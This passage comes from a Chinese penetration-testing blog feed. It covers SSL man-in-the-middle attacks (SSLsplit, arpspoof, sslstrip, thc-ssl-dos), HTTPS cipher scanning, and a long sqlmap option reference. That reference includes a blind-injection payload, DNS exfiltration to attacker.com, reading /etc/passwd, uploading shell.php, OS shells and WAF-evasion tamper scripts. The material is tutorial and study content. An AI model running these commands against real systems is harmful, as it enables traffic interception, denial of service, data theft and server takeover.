-    <content type="html"><![CDATA[<p>攻击者位于客户端和服务器通信链路中<br>    ARP        // Data link层,修改MAC地址,ARP Spoof让流量流经中间人<br>    DHCP    // 动态主机配置协议,用来自动获取IP<br>    修改网关<br>    修改DNS<br>    修改HOSTS<br>    ICMP,STP,OSPF<br>加密流量        // 伪造证书解密</p><p><strong>攻击的前提</strong></p><ul><li>客户端已经信任伪造证书颁发机构</li><li>攻击者控制了核发证书颁发机构</li><li>客户端程序禁止了显示证书错误告警信息</li><li>攻击者已经控制客户端,并强制其信任伪造证书</li></ul><h4 id="SSLsplit"><a href="#SSLsplit" class="headerlink" title="SSLsplit"></a><strong>SSLsplit</strong></h4><p>透明SSL/TLS中间人攻击工具<br>对客户端伪造成服务器,对服务器伪装成普通客户端<br>伪装服务器需要伪造证书<br>支持SSL/TLS加密的SMTP,POP3,FTP等通信中间人攻击<br><strong>利用openssl生成证书私钥</strong><br>    <code>openssl genrsa -out ca.key 2048</code><br><strong>利用私钥签名生成证书</strong><br>    <code>openssl reg -new -x509 -days 1096 -key ca.key -out ca.crt</code></p><h4 id="启动路由"><a href="#启动路由" class="headerlink" title="启动路由"></a><strong>启动路由</strong></h4><pre><code>sysctl -w net.ipv4.ip_forward=1cat /proc/sys/net/ipv4/ip_forwardecho 1 &gt; /proc/sys/net/ipv4/ip_forward</code></pre><h4 id="Iptables端口转发规则"><a href="#Iptables端口转发规则" class="headerlink" title="Iptables端口转发规则"></a><strong>Iptables端口转发规则</strong></h4><pre><code>iptables -t nat -F        //清空当前已有规则iptables -t nat -A PREROUTING -p tcp --dport 80 -j REDIRECT --to-ports 8080iptables -t nat -A PREROUTING -p tcp --dport 443 -j REDIRECT --to-ports 8443iptables -t nat -A PREROUTING -p tcp --dport 587 -j REDIRECT --to-ports 8443 #MSAiptables -t nat -A PREROUTING -p tcp --dport 465 -j REDIRECT --to-ports 8443 #SMTPSiptables -t nat -A PREROUTING -p tcp --dport 993 -j REDIRECT --to-ports 8443 #IMAPSiptables -t nat -A PREROUTING -p tcp --dport 995 -j REDIRECT --to-ports 8443 #POP3Siptables -t nat -L        //查看nat规则netstat -pantu | grep :80        //查看80端口是否被占用</code></pre><h4 id="ARP欺骗"><a href="#ARP欺骗" class="headerlink" title="ARP欺骗"></a><strong>ARP欺骗</strong></h4><pre><code>arpspoof -i eth0 -t 1.1.1.2 -r 1.1.1.1</code></pre><h4 id="启动SSLsplit"><a href="#启动SSLsplit" class="headerlink" title="启动SSLsplit"></a><strong>启动SSLsplit</strong></h4><pre><code>mkdir -p test/logdirsslsplit -D -l connect.log -j /root/test -S logdir/ -k ca.key -c ca.crt ssl 0.0.0.0 8443 tcp 0.0.0.0 8080</code></pre><p>被害者访问taobao,baidu,mail.163.com<br>查看日志和浏览器证书及证书报错信息<br>安装服务器根证书之后再次访问</p><h4 id="Mitmproxy"><a href="#Mitmproxy" class="headerlink" title="Mitmproxy"></a><strong>Mitmproxy</strong></h4><pre><code>iptables端口转发规则iptables -t nat -F        //清空当前已有规则iptables -t nat -A PREROUTING -i eth0 -p tcp --dport 80 -j REDIRECT --to-port 8080iptables -t nat -A PREROUTING -i eth0 -p tcp --dport 443 -j REDIRECT --toport 8080</code></pre><p>Mitmproxy和sslsplit类似,也需要先执行ARP欺骗,且有个BUG,iptables端口只能转发8080有效<br>     mitmproxy -T –host -w mitmproxy.log</p><h4 id="SSLstrip"><a href="#SSLstrip" class="headerlink" title="SSLstrip"></a><strong>SSLstrip</strong></h4><p>与前两种工具不同,将客户端到中间人之间的流量变为明文<br>一样也需要结合ARP欺骗<br>    <code>sslstrip -l 8080</code></p><blockquote><h3 id="SSL-TLS拒绝服务攻击"><a href="#SSL-TLS拒绝服务攻击" class="headerlink" title="SSL/TLS拒绝服务攻击"></a><strong>SSL/TLS拒绝服务攻击</strong></h3></blockquote><ul><li>thc-ssl-dos<br>SSL协商加密对性能开销增加,大量握手请求会导致拒绝服务<br>利用SSL secure Renegotiation特性,在单一TCP连接中生成数千个SSL重连接请求,造成服务器资源过载<br>与流量式拒绝服务攻击不同,thc-ssl-dos可以利用dsl线路打垮30G带宽的服务器<br>服务器平均可以处理300次/秒SSL握手请求<br>对SMTPS,POP3S等服务同样有效<br><code>thc-ssl-dos 1.1.1.1 443 -accept</code></li></ul><p>对策<br>禁用SSL-Renegotiation,使用SSL Accelerator<br>通过修改thc-ssl-dos代码,可以绕过以上对策    </p>]]></content>
-    
-    <summary type="html">
-    
-      
-      
-        &lt;p&gt;攻击者位于客户端和服务器通信链路中&lt;br&gt;    ARP        // Data link层,修改MAC地址,ARP Spoof让流量流经中间人&lt;br&gt;    DHCP    // 动态主机配置协议,用来自动获取IP&lt;br&gt;    修改网关&lt;br&gt;    修改DNS&lt;
-      
-    
-    </summary>
-    
-    
-      <category term="渗透测试" scheme="http://c.cat.plus/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
-    
-      <category term="Web渗透" scheme="http://c.cat.plus/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/Web%E6%B8%97%E9%80%8F/"/>
-    
-    
-      <category term="ARP欺骗" scheme="http://c.cat.plus/tags/ARP%E6%AC%BA%E9%AA%97/"/>
-    
-      <category term="SSLsplit" scheme="http://c.cat.plus/tags/SSLsplit/"/>
-    
-      <category term="DOS攻击" scheme="http://c.cat.plus/tags/DOS%E6%94%BB%E5%87%BB/"/>
-    
-      <category term="拒绝服务攻击" scheme="http://c.cat.plus/tags/%E6%8B%92%E7%BB%9D%E6%9C%8D%E5%8A%A1%E6%94%BB%E5%87%BB/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>HTTPS漏洞及攻击方法</title>
-    <link href="http://c.cat.plus/2014/05/18/Web_Attacks/HTTPS%E6%BC%8F%E6%B4%9E%E5%8F%8A%E6%94%BB%E5%87%BB%E6%96%B9%E6%B3%95/"/>
-    <id>http://c.cat.plus/2014/05/18/Web_Attacks/HTTPS%E6%BC%8F%E6%B4%9E%E5%8F%8A%E6%94%BB%E5%87%BB%E6%96%B9%E6%B3%95/</id>
-    <published>2014-05-18T14:22:32.000Z</published>
-    <updated>2020-05-19T06:24:18.883Z</updated>
-    
-    <content type="html"><![CDATA[<blockquote><h3 id="HTTPS攻击"><a href="#HTTPS攻击" class="headerlink" title="HTTPS攻击"></a><strong>HTTPS攻击</strong></h3></blockquote><p>全站HTTPS正成为潮流趋势<br>    淘宝,百度<br>HTTPS的作用<br>    信息安全3要素: <strong><code>CIA</code></strong> (安全性,完整性,可用性)<br>    解决的是信息传输过程中数据被篡改,窃取<br>    加密:对称,非对称,单向<br>HTTPS攻击方法<br>    降级攻击<br>    解密攻击(明文,证书伪造)<br>    协议漏洞,实现方法的漏洞,配置不严格</p><p><strong>SSL</strong>(Secure Socket Layer)    // <em>1安全套接层</em><br>保证网络通信安全的加密协议<br>1994年由Netscape开发成为统一标准<br>1999年 <strong>TLS</strong>(Transport Layer Security)取代SSL v3<br>近年来发现的SSL协议漏洞使业界认为其漏洞已不可软件修复<br>    Heartbleed<br>    POODIE<br>    BEAST<br>TLS 当前最新版本 1.2<br>TLS/SSL,HTTPS,HTTP over SSL 通俗上表示同一含义</p><p>SSL/TLS也被用于其它场景的传输通道加密<br>邮件传输(服务器间,客户端与服务器间)<br>数据库服务器间<br>LDAP身份认证服务器间<br>SSL VPN<br>远程桌面RDP通信过程中的加密和身份认证</p><h4 id="Web通信中的SSL加密"><a href="#Web通信中的SSL加密" class="headerlink" title="Web通信中的SSL加密"></a><strong>Web通信中的SSL加密</strong></h4><p>公钥证书(受信任的第三方证书颁发机构签名颁发)<br>    VeriSign<br>    Thawte<br>    GlobalSign<br>    Symantec</p><h4 id="加密过程"><a href="#加密过程" class="headerlink" title="加密过程"></a><strong>加密过程</strong></h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">A(握手) --&gt;B(协商加密算法) </span><br><span class="line">B --&gt; C(获取公钥证书)</span><br><span class="line">C --&gt; D(验证公钥证书)</span><br><span class="line">D --&gt; E(交换会话密钥)</span><br><span class="line">E --&gt; F(加密信息传输)</span><br></pre></td></tr></table></figure><h4 id="常见加密算法"><a href="#常见加密算法" class="headerlink" title="常见加密算法"></a><strong>常见加密算法</strong></h4><p><strong>非对称加密算法</strong><br>    Diffie-Hellman key exchange<br>    Rivest Shamir Adleman (RSA)<br>    Elliptic Curve Cryptography (ECC)<br><strong>对称加密算法</strong><br>    Data Encryption Standard (DES) / 3DES<br>    Advance Encryption Standard (AES)<br>    International Data Encryption Algorithm (IDEA)<br>    Rivest Cipher 4 (RC4)<br>        WEP̵TLS/SSL̵RDP̵Secure shell<br><strong>单向加密算法</strong></p><table><thead><tr><th>HASH算法</th><th>HASH值长度(bit)</th></tr></thead><tbody><tr><td>MD5</td><td>128</td></tr><tr><td>SHA-1</td><td>160</td></tr><tr><td>SHA-2</td><td>224, 256, 384, 512</td></tr></tbody></table><p>SHA-3已经设计完成,但尚未广泛使用<br>SHA-2是TLS 1.2唯一支持的单向加密算法<br>碰撞攻击针对单向加密算法<br>    两个不同的文件生成相同的HASH值</p><h4 id="SSL的弱点"><a href="#SSL的弱点" class="headerlink" title="SSL的弱点"></a><strong>SSL的弱点</strong></h4><p>SSL是不同的对称,非对称,单向加密算法的组合加密实现(cipher suite)</p><table><thead><tr><th>加密算法</th><th>SSL实现中的用途</th></tr></thead><tbody><tr><td>RAS / Diffle-Hellman</td><td>密钥交换,身份认证</td></tr><tr><td>AES</td><td>加密数据,由RAS/DH完成密钥交换</td></tr><tr><td>HMAC-SHA2</td><td>摘要信息</td></tr></tbody></table><p>服务器端为提供更好的兼容性,选择支持大量过时cipher suite<br>协商过程中强迫降级加密强度<br>现代处理器计算能力可以在可接受的时间内破解过时加密算法<br>购买云计算资源破解</p><h4 id="Openssl"><a href="#Openssl" class="headerlink" title="Openssl"></a><strong>Openssl</strong></h4><p>直接调用openssl库识别目标服务器支持的SSL/TLS cipher suite</p><pre><code>openssl s_client -connect www.baidu.com:443openssl s_client -tls1_2 -cipher &apos;ECDH-RSA-RC4-SHA&apos; -connect www.taobao.com:443    密钥交换-身份认证-数据加密-HASH算法openssl s_client -tls1_2 -cipher “NULL,EXPORT,LOW,DES” -connect  www.taobao.com:443    (协商低安全级别cipher suite)可被破解的cipher suite    openssl ciphers -v &quot;NULL,EXPORT,LOW,DES&quot;https://www.openssl.org/docs/apps/ciphers.html</code></pre><p>Openssl需要大量密码学相关知识,命令复杂,结果可读性差</p><h4 id="SSLScan"><a href="#SSLScan" class="headerlink" title="SSLScan"></a><strong>SSLScan</strong></h4><p>自动识别SSAL配置错误,过期协议,过时cipher suite和hash算法<br>    默认会检查CRIME,heartbleed漏洞<br>    绿色表示安全,红色黄色需要引起注意<br>    TLS支持的cipher suite<br>        <code>sslscan --tlsall www.taobao.com:443</code><br>    分析证书详细数据<br>        <code>sslscan --show-certificate --no-ciphersuites www.taobao.com:443</code></p><h4 id="SSLyze"><a href="#SSLyze" class="headerlink" title="SSLyze"></a><strong>SSLyze</strong></h4><p>Python语言编写<br>    检查SSL过时版本<br>    检查存在弱点的cipther suite<br>    扫描多站点时,支持来源文件<br>    检查是否支持会话恢复<br><code>sslyze --regular  www.taobao.com:443</code></p><h4 id="Nmap"><a href="#Nmap" class="headerlink" title="Nmap"></a><strong>Nmap</strong></h4><pre><code>nmap --script=ssl-enum-ciphers.nse www.taobao.comdpkg -L nmap | grep script | grep ssl    #查看nmap扫描ssl相关脚本</code></pre><p><a href="https://www.ssllabs.com/ssltest" target="_blank" rel="noopener">https://www.ssllabs.com/ssltest</a></p>]]></content>
-    
-    <summary type="html">
-    
-      
-      
-        &lt;blockquote&gt;
-&lt;h3 id=&quot;HTTPS攻击&quot;&gt;&lt;a href=&quot;#HTTPS攻击&quot; class=&quot;headerlink&quot; title=&quot;HTTPS攻击&quot;&gt;&lt;/a&gt;&lt;strong&gt;HTTPS攻击&lt;/strong&gt;&lt;/h3&gt;&lt;/blockquote&gt;
-&lt;p&gt;全站HTTP
-      
-    
-    </summary>
-    
-    
-      <category term="渗透测试" scheme="http://c.cat.plus/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
-    
-      <category term="Web渗透" scheme="http://c.cat.plus/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/Web%E6%B8%97%E9%80%8F/"/>
-    
-    
-      <category term="sslscan" scheme="http://c.cat.plus/tags/sslscan/"/>
-    
-      <category term="Heartbleed" scheme="http://c.cat.plus/tags/Heartbleed/"/>
-    
-      <category term="加密算法" scheme="http://c.cat.plus/tags/%E5%8A%A0%E5%AF%86%E7%AE%97%E6%B3%95/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>SQLMAP自动注入参数详解</title>
-    <link href="http://c.cat.plus/2014/05/06/Web_Attacks/SQLMAP%E8%87%AA%E5%8A%A8%E6%B3%A8%E5%85%A5/"/>
-    <id>http://c.cat.plus/2014/05/06/Web_Attacks/SQLMAP%E8%87%AA%E5%8A%A8%E6%B3%A8%E5%85%A5/</id>
-    <published>2014-05-06T11:26:37.000Z</published>
-    <updated>2020-05-28T03:20:59.973Z</updated>
-    
-    <content type="html"><![CDATA[<blockquote><h4 id="SQLMAP自动注入"><a href="#SQLMAP自动注入" class="headerlink" title="SQLMAP自动注入"></a><strong>SQLMAP自动注入</strong></h4><p>开源sql注入漏洞检测,利用工具<br>检测动态页面中get/post参数,cookie,http头<br>数据榨取<br>文件系统访问<br>操作系统命令行<br>引擎强大,特性丰富<br>XSS漏洞检测</p></blockquote><h5 id="五种漏洞检测技术"><a href="#五种漏洞检测技术" class="headerlink" title="五种漏洞检测技术"></a><strong>五种漏洞检测技术</strong></h5><ul><li><p>基于布尔的盲注检测</p></li><li><p>基于时间的盲注检测<br>  <code>&#39; and (select * from (select(sleep(20)))a)--+</code></p></li><li><p>基于错误的检测</p></li><li><p>基于UNION联合查询的检测<br>  <em>适用于通过循环直接输出联合查询结果,否则只显示每一项结果</em></p></li><li><p>基于堆叠查询的检测<br>  <em>;堆叠多个查询语句</em><br>  <em>适用于非select的数据修改,删除的操作</em></p></li><li><p>支持的数据库管理系统DBMS<br>  <code>MYSQL,Oracle,PostgreSQL Server,Microsoft Access,IBM DB2,SQLite,Firebird,Sybase,SAP MaxDB</code></p></li></ul><h4 id="其它特性"><a href="#其它特性" class="headerlink" title="其它特性"></a><strong>其它特性</strong></h4><p>数据库直接连接 -d<br>    不通过SQL注入,制定身份认证信息,IP,端口<br>与burpsuite,google结合使用,支持正则表达式限定测试目标<br>Get,post,cookie,Referer,User-Agent(随机或指定)<br>    Cookie过期后自动处理Set-Cookie头,更新cookie信息<br>限速:最大并发,延迟发送<br>支持Basic,Digest,NTLM,CA身份认证<br>数据库版本,用户,权限,hash枚举和字典破解,暴力破解表列名称<br>文件上传下载,UDF,启动并执行储存过程,操作系统命令执行,访问windows注册表<br>与w3af,metasploit集成结合使用,基于数据库服务进程提权和上传执行后门</p><p><strong>基于python2.7 开发</strong></p><p><strong>安装</strong></p><pre><code>apt-get install gitgit clone https://github.com/sqlmapproject/sqlmap.git sqlmap-dev</code></pre><p><strong>升级</strong></p><pre><code>sqlmap --update        #在线git pull            #离线Kali集成版随kali库更新</code></pre><h4 id="基本使用"><a href="#基本使用" class="headerlink" title="基本使用"></a><strong>基本使用</strong></h4><pre><code>sqlmap -h &amp; -hhsqlmap -d &quot;mysql://root:@192.168.190.163:3306/dvwa&quot; -f --users --banner --dbs --schema -asqlmap --version -v</code></pre><p><strong>日志</strong><br>    <code>.sqlmap</code><br><strong>输出</strong></p><ul><li>输出内容详细度分7个等级</li></ul><p><strong>Get方法</strong></p><pre><code>sqlmap -u &quot;http://192.168.190.163/mutillidae/index.php?page=userinfo.php&amp;username=11&amp;password=22&amp;user-info-php-submit-button=View +Account+Details&quot; -p username -f</code></pre><p><strong>扫描URL列表文件</strong></p><pre><code>http://1.1.1.1/vuln1.php?q=foobarhttp://1.1.1.1/vuln3/id/1*sqlmap -m list.txt</code></pre><p><strong>扫描google搜索结果</strong></p><pre><code>sqlmap -g &quot;inurl:\&quot;.php?id=1\&quot;&quot;</code></pre><p><strong>POST方法</strong></p><pre><code>使用http请求文件(burpsuite)    sqlmap -r request.txt使用burpsuite log文件    sqlmap -l log.txt</code></pre><p><strong>HTTPS</strong></p><pre><code>sqlmap -u &quot;https://1.1.1.1/a.php?id=1:8843&quot; --force-ssl</code></pre><p><strong>扫描配置文件</strong></p><pre><code>sqlmap -c sqlmap.conf</code></pre><h4 id="SQLMAP自动注入—Request"><a href="#SQLMAP自动注入—Request" class="headerlink" title="SQLMAP自动注入—Request"></a><strong>SQLMAP自动注入—Request</strong></h4><pre><code>数据段:    --dataget / post都适用splmap -u &quot;http://1.1.1.1/a.php&quot; --data&quot;user=1&amp;pass=2&quot; -f变量分隔符: --param-delhttp://1.1.1.1/a.php?q=foo;id=1        // ; &amp;sqlmap -u &quot;http://1.1.1.1/a.php&quot; --data=&quot;q=foo;id=1&quot; --param-del=&quot;;&quot; -fcookie头: --cookieweb应用需要基于cookie的身份认证检查cookie中的注入点(level&gt;=2)Set-Cookie / --drop-set-cookie / --cookie-delsqlmap -u &quot;http://1.1.1.1/a.php?id=1&quot; --cookie=&quot;a=1;b=2&quot; -f--user-agent    sqlmap/1.0-dev-xxxxxxx (http://sqlmap.org)     #默认user-agent--random-agent        #随机user-agent    /usr/share/sqlmap/txt/user-agents.txt sqlmap检查user-agent中的注入点:Level&gt;=3APP/WAF/IPS/IDS过滤异常user-agent时报错    [hh:mm:20] [ERROR] the target URL responded with an unknown HTTP status code, try to force the HTTP User-Agent header with option --useragent or --random-agentHost头: --host=&quot;&quot;Level 5Referer头:    --referrerLevel&gt;=3定义的header: --headers每个头单独一行(名称区分大小写)*sqlmap -u &quot;http://1.1.1.1/a.php?id=1&quot; --headers=&quot;host:www.a.com\nUser-Agent:owl&quot;--method=GET/POST</code></pre><p><strong>基于HTTP协议的身份验证</strong></p><ul><li>Basic</li><li>Digest</li><li>NTLM<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;http:&#x2F;&#x2F;1.1.1.1&#x2F;a.php?id&#x3D;1&quot; --auth-type Basic --auth-cred &quot;user:pass&quot;</span><br><span class="line"></span><br><span class="line">--auth-cert &#x2F; --auth-file</span><br><span class="line">&#96;--auth-file&#x3D;&quot;ca.PEM&quot;&#96;</span><br><span class="line"> 有私钥的PEM格式证书文件</span><br><span class="line">PEM格式的证书链文件</span><br></pre></td></tr></table></figure></li></ul><p><strong>http(s)代理</strong></p><pre><code>--proxy=&quot;http://127.0.0.1:8087/&quot;--proxy-cred=&quot;name:pass&quot;--ignore-proxy    忽略系统级代理设置,通常用于扫描本地网络目标sqlmap -u &quot;http://1.1.1.1/a.php?id=1&quot; --proxy=&quot;http://127.0.0.1:8087&quot; -f--delay    每次http(s)请求之间,浮点数,单位为秒,默认无延迟--timeout    请求超时时间,浮点数,默认为30秒--retries    http(s)连接超时重试次数,默认3次--randomize    长度,类型与原始值保持一致的前提下,指定每次请求随机取值的参数名        sqlmap -u http://1.1.1.1/a.php?id=100 -randomize=&quot;id&quot;--scope    过滤日志内容,通过正则表达式筛选扫描对象    sqlmap -l burp.log --scope=&quot;(www)?\.target\.(com|net|org)&quot;    sqlmap -l 2.log --scope=&quot;(19)?\.168\.20\.(1|10|100)&quot; --level 3 --dbs    User-agent中的注入点--safe-url / --safe-freq    检测和盲注阶段会产生大量失败请求,服务器端可能因此销毁session    每发送--safe-freq次注入请求后,发送一次正常请求--skip-urlencode    默认Get方法会对传输内容进行编码,某些WEB服务器不遵守RFC标准编码,使用原始字符提交数据--eval    每次请求前执行指定的python代码    每次请求更改或增加新的参数值(时间依赖,其他参数值依赖)    sqlmap -u &quot;http://1.1.1.1/a.php? id=1&amp;hash=c4ca4238a0b923820dcc509a6f75849b&quot; --eval=&quot;import hashlib;hash=hashlib.md5(id).hexdigest()&quot;</code></pre><h4 id="SQLMAP自动注入—Optimization-优化参数"><a href="#SQLMAP自动注入—Optimization-优化参数" class="headerlink" title="SQLMAP自动注入—Optimization    #优化参数"></a><strong>SQLMAP自动注入—Optimization</strong>    #优化参数</h4><p><strong>优化性能</strong></p><pre><code>--predict-output    根据检测方法,比对返回值和统计表内容,不断缩小检测范围,提高检测效率    版本名,用户名,密码,Privileges,role,数据库名称,表名,列名与--threads参数不兼容    统计表:/usr/share/sqlmap/txt/common-outputs.txt--keep-alive    使用http(s)长连接,性能好    与--proxy参数不兼容    长连接避免重复建立连接的网络开销,但大量长连接会严重占用服务器资源--null-connection    只获取相应页面的大小值,而非页面具体内容    通常用于盲注判断 真/假,降低网络带宽消耗    与--text-only参数不兼容(基于页面内容的比较判断 真/假)--threads    最大并发线程    盲注时每个线程获取一个字符(7次请求),获取完成后线程结束    默认值为1,建议不要超过10,否则可能影响站点可用性    与--predict-output参数不兼容-o    开启前三个性能参数(除--threads参数)</code></pre><h4 id="SQLMAP自动注入—Injection-注入"><a href="#SQLMAP自动注入—Injection-注入" class="headerlink" title="SQLMAP自动注入—Injection    #注入"></a><strong>SQLMAP自动注入—Injection</strong>    #注入</h4><pre><code>-p    指定扫描的参数,使--level失效    -p &quot;user-agent,referer&quot;--URI注入点    sqlmap -u &quot;http://targeturl/param1/value1*/param2/value2/&quot;--dbms=&quot;mysql&quot;    MySQL&lt;5.0&gt;    Oracle&lt;11i&gt;    Microsoft SQL Server &lt;2005&gt;    PostgreSQL    Microsoft Access    SQLite    Firebird    Sybase    SAP MaxDB    DB2--OS    Linux    Windows--invalid-bignum / --invalid-logical    通常sqlmap使用负值使参数取值失效 id=13-&gt; id=-13    bignum使用大数使参数值失效 id=99999999    Logcal使用布尔判断使取值失效id=13 AND 18=19--no-cast    榨取数据时,sqlmap将所有结果转换为字符串,并用空格替换NULL结果    老版本mysql数据库需要开启此开关--no-escape    出于混淆和避免出错的目的,payload中用单引号界定字符串时,sqlmap使用char()编码逃逸的方法替换字符串    SELECT &apos;foo&apos; -&gt; SELECT CHAR(102)+CHAR(111)+CHAR(111)     本参数将关闭此功能--prefix / --suffix    $query = &quot;SELECT * FROM users WHERE id=(’&quot; . $_GET[’id’] . &quot;’) LIMIT 0, 1&quot;;    sqlmap -u &quot;http://1.1.1.1/sqlmap/mysql/get_str_brackets.php?id=1&quot;  -p id --prefix &quot;’)&quot; --suffix &quot;AND (’abc’=’abc“     query = &quot;SELECT * FROM users WHERE id=(’1’) &lt;PAYLOAD&gt; AND (’abc’=’abc’) LIMIT 0, 1&quot;;--tamper    #常用    混淆脚本,用于绕过应用层过滤,IPS,WAF    sqlmap -u “http://1.1.1.1/a.php?id=1” --tamper=&quot;between.py,randomcase.py,space2comment.py&quot; -v 3    dpkg -L sqlmap | grep tamper    #kali查找脚本所在路径</code></pre><h4 id="SQLMAP自动注入—Detection-检测"><a href="#SQLMAP自动注入—Detection-检测" class="headerlink" title="SQLMAP自动注入—Detection    #检测"></a><strong>SQLMAP自动注入—Detection</strong>    #检测</h4><pre><code>--level    1-5级(默认1)    /usr/share/sqlmap/xml/payloads--risk    1-4(默认 1/ 无害)    Risk升高可造成数据被篡改等风险(update)--string,--not-string,--regexp,--code,--text--only,--titles    页面比较,基于布尔的注入检测,依据返回页面内容的变化判断真假逻辑,但有些页面随时间阈值变化,此时需要人为指定标识真假的字符串.</code></pre><h4 id="SQLMAP自动注入—Techniques-技术"><a href="#SQLMAP自动注入—Techniques-技术" class="headerlink" title="SQLMAP自动注入—Techniques    #技术"></a><strong>SQLMAP自动注入—Techniques</strong>    #技术</h4><pre><code>默认使用全部技术B:Boolean-based blindE:Error-basedU:Union query-basedS:Stacked queries(文件系统,操作系统,注册表必须)T:Time-based blind--time-sec    基于时间的注入检测相应延迟时间(默认5秒)--union-cols    默认联合查询1-10列,随--level增加最多支持50列    --union-cols 6-9--union-char    联合查询默认使用NULL,极端情况下NULL可能失败,此时可以手动指定数值    --union-char 123--dns-domain    攻击者控制了某DNS服务器,使用此功能可以提高数据榨取的速度    --dns-domain attacker.com--second-order    在一个页面注入的结果,从另一个页面体现出来    --second-order http://1.1.1.1/b.php</code></pre><h4 id="SQLMAP自动注入—Fingerprint-指纹信息"><a href="#SQLMAP自动注入—Fingerprint-指纹信息" class="headerlink" title="SQLMAP自动注入—Fingerprint        #指纹信息"></a><strong>SQLMAP自动注入—Fingerprint</strong>        #指纹信息</h4><pre><code>-f,--fingerprint,-b,--banner    数据库管理系统指纹信息    DBMS,操作系统,架构,补丁</code></pre><h4 id="SQLMAP自动注入—Enumeration-枚举"><a href="#SQLMAP自动注入—Enumeration-枚举" class="headerlink" title="SQLMAP自动注入—Enumeration        #枚举"></a><strong>SQLMAP自动注入—Enumeration</strong>        #枚举</h4><pre><code>--current-user        #查当前数据库账号--current-db        #查当前数据库--hostname            #查主机名--users                #查数据库管理系统所有账号--privileges -U username    (CU 当前账号)    #查用户权限--roles                #查角色--dbs                #查所有数据库--tables,--exclude-sysdbs -D dvwa    #排除系统库,指定数据库查表查列-T users -D dvwa -C user --columns    #指定列查询数据--schema --batch --exclude-sysdbs 元数据(使用默认选项)    #表结构--count                #计数Dump数据    --dump,-C,-T,-D,--start,--stop        #分段备份数据    --dump-all -exclude-sysdbs            #备份所有数据    --sql-query &quot;select * from users&quot;    #根据sql查询语句dump数据</code></pre><h4 id="SQLMAP自动注入—Brute-Force-暴力破解"><a href="#SQLMAP自动注入—Brute-Force-暴力破解" class="headerlink" title="SQLMAP自动注入—Brute Force        #暴力破解"></a><strong>SQLMAP自动注入—Brute Force</strong>        #暴力破解</h4><pre><code>Mysql &lt; 5.0,没有information_schema库Mysql &gt;= 5.0,但无权读取information_schema库微软的access数据库,默认无权读取MSysObjects库--common-tables            #暴力破解表--common-columns    (Access系统表无列信息)    #暴力破解表的列</code></pre><h4 id="SQLMAP自动注入—UDF-Injection-用户自定义函数注入"><a href="#SQLMAP自动注入—UDF-Injection-用户自定义函数注入" class="headerlink" title="SQLMAP自动注入—UDF Injection    #用户自定义函数注入"></a><strong>SQLMAP自动注入—UDF Injection</strong>    #用户自定义函数注入</h4><pre><code>--udf-inject , --shared-lib编译共享库创建并上传至DB Server,以此生成UDF实现高级注入Linux: shared objectWindows: DLLhttp://www.slideshare.net/inquis/advanced-sql-injection-to-operating-systemfull-control-whitepaper-4633857</code></pre><h4 id="SQLMAP自动注入—File-System-文件系统访问"><a href="#SQLMAP自动注入—File-System-文件系统访问" class="headerlink" title="SQLMAP自动注入—File System    #文件系统访问"></a><strong>SQLMAP自动注入—File System</strong>    #文件系统访问</h4><pre><code>--file-read=&quot;/etc/passwd&quot;     #读文件--file-write=&quot;shell.php&quot; --file-dest &quot;/tmp/shell.php&quot;    #写文件并通过--file-dest指定存放位置</code></pre><h4 id="SQLMAP自动注入—OS-操作系统访问"><a href="#SQLMAP自动注入—OS-操作系统访问" class="headerlink" title="SQLMAP自动注入—OS        #操作系统访问"></a><strong>SQLMAP自动注入—OS</strong>        #操作系统访问</h4><pre><code>Mysql,postgresql    上传共享库并生成sys_exec(),sys_eval()两个UDFMssql    xp_cmdshell    储存过程(有就用,禁了启,没有建)    --os-cmd    --os-shell    --sql-shell</code></pre><h4 id="SQLMAP自动注入—Windows-Registory-Windows注册表注入修改"><a href="#SQLMAP自动注入—Windows-Registory-Windows注册表注入修改" class="headerlink" title="SQLMAP自动注入—Windows Registory        #Windows注册表注入修改"></a><strong>SQLMAP自动注入—Windows Registory</strong>        #Windows注册表注入修改</h4><pre><code>--reg-read--reg-add--reg-del--reg-key,--reg-value,--reg-data,--reg-typesqlmap –u=&quot;http://1.1.1.1/a.aspx?id=1&quot; --reg-add --regkey=&quot;HKEY_LOCAL_MACHINE\SOFTWARE\sqlmap&quot; --reg-value=Test -reg-type=REG_SZ --reg-data=1</code></pre><h4 id="SQLMAP自动注入—General-一般常用参数"><a href="#SQLMAP自动注入—General-一般常用参数" class="headerlink" title="SQLMAP自动注入—General        #一般常用参数"></a><strong>SQLMAP自动注入—General</strong>        #一般常用参数</h4><pre><code>-s: sqllite会话文件保存位置-t:    记录流量文件保存位置--charset:强制字符编码    --charset=GBK--crawl: 从起始位置爬站深度    --batch --crawl=3--cvs-del: dump数据默认存于&quot;,&quot;分割的CSV文件中,指定其它分隔符    --csv-del=&quot;;&quot;--dbms-cred:指定数据库账号--flush-session: 清空session--force-ssl            #注入https的网站--fresh-queries        #忽略session查询结果--hex                #dump非ASCLL字符内容时,将其编码为16进制形式,收到后解码还原    sqlmap -u &quot;http://1.1.1.1/s.php?id=1&quot; --hex -v 3--output-dir=/tmp--parse-errors        #分析和现实数据库内建报错信息    sqlmap.py -u &quot;http://1.1.1.1/sqlmap/a.asp?id=1&quot; --parse-errors--save                #将命令保存成配置文件</code></pre><h4 id="SQLMAP自动注入—Miscellaneous-杂项参数"><a href="#SQLMAP自动注入—Miscellaneous-杂项参数" class="headerlink" title="SQLMAP自动注入—Miscellaneous    #杂项参数"></a><strong>SQLMAP自动注入—Miscellaneous</strong>    #杂项参数</h4><pre><code>-z        #参数助记符sqlmap --batch --random-agent --ignore-proxy --technique=BEU -u “1.1.1.1/a.php?id=1&quot;sqlmap -z &quot;bat,randoma,ign,tec=BEU&quot; -u “1.1.1.1/a.php?id=1&quot; sqlmap --ignore-proxy --flush-session --technique=U --dump -D testdb -T users -u “1.1.1.1/a.php?id=1&quot; 